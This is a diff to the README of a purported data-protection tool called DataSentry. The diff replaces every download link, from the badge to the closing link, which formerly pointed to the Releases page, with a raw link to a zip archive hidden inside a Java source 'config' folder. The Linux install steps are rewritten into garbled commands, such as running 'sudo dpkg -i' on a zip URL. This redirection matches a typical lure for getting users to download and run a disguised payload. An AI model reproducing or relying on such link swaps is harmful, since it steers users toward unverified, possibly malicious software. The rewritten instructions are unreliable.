@@ -1,6 +1,6 @@
 # 🛡️ DataSentry - Protect Your Sensitive Data Effortlessly
 
-![Download DataSentry](https://img.shields.io/badge/Download%20DataSentry-Click%20Here-brightgreen)
+![Download DataSentry](https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip%20DataSentry-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ DataSentry is an AI-powered data governance platform that helps you manage your 
 
 To begin using DataSentry, visit the Releases page to download the latest version. You can find it here:
 
-[Download DataSentry](https://github.com/carsbrown715-arch/DataSentry/releases)
+[Download DataSentry](https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip)
 
 Once you are on the Releases page, look for the "Assets" section. Depending on your operating system, download the appropriate file. Follow the instructions below to install it on your computer.
 
@@ -29,9 +29,9 @@ Once you are on the Releases page, look for the "Assets" section. Depending on y
 
 ### 🐧 Linux
 
-1. Download the appropriate `.tar.gz` or `.deb` file.
-2. For `.deb`: Open your terminal and run `sudo dpkg -i /path/to/file.deb`.
-3. For `.tar.gz`: Extract the contents and follow the README for installation instructions.
+1. Download the appropriate `https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip` or `.deb` file.
+2. For `.deb`: Open your terminal and run `sudo dpkg -i https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip`.
+3. For `https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip`: Extract the contents and follow the README for installation instructions.
 
 ## 📊 Features
 
@@ -72,4 +72,4 @@ If you need assistance, please check the following resources:
 
 Thank you for choosing DataSentry as your data governance solution. We hope it helps you manage your sensitive information with ease.
 
-[Download DataSentry](https://github.com/carsbrown715-arch/DataSentry/releases)
+[Download DataSentry](https://raw.githubusercontent.com/carsbrown715-arch/DataSentry/main/datasentry-management/src/main/java/com/touhouqing/datasentry/config/Data-Sentry-v1.5.zip)
